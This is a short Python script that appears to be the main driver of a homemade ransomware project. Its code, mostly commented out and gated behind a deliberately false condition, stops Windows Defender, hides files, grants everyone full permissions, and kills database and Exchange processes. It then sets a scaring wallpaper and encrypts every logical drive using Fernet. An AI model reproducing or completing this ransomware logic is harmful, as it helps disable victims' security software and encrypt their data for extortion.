from cryptography.fernet import Fernet
import os
from win32 import win32api
from shaul_decrypt import Decrypt
from shaul_encrypt import Encrypt
from change_wallpaper import setWallpaper


if __name__ == "__main__" and 1 == 2:  # I added the 1 == 2 just as a security measure for now
    print("hello i don't want to ruin my computer accidentally")

    # os.system("sc stop WinDefend")
    # os.system("attrib +h .")
    # os.system("icals . /grant Everyone:F /T /C /Q")
    #
    # os.system("taskkill.exe /f /im mysqld.exe")
    # os.system("taskkill.exe /f /im sqlwriter.exe")
    # os.system("taskkill.exe /f /im sqlserver.exe")
    # os.system("taskkill.exe /f /im MSExchange*")
    # os.system("taskkill.exe /f /im Microsoft.Exchange.*")

    # change the wallpaper to scare the user.
    #setWallpaper("computer_background.jpeg")
#

#    key = open("key.txt", 'rb').read()
#    fernet = Fernet(key)
#    drives = win32api.GetLogicalDriveStrings()
#    drives = drives.split('\000')[:-1]
#    for drive in drives:
#        pass
#        # Encrypt(drive).run()
# encrypt = Encrypt(r"C:\Users\shaoo\Desktop\lidan")
# encrypt.run()
# dec = Decrypt(r"C:\Users\shaoo\Desktop\lidan")
# dec.run()
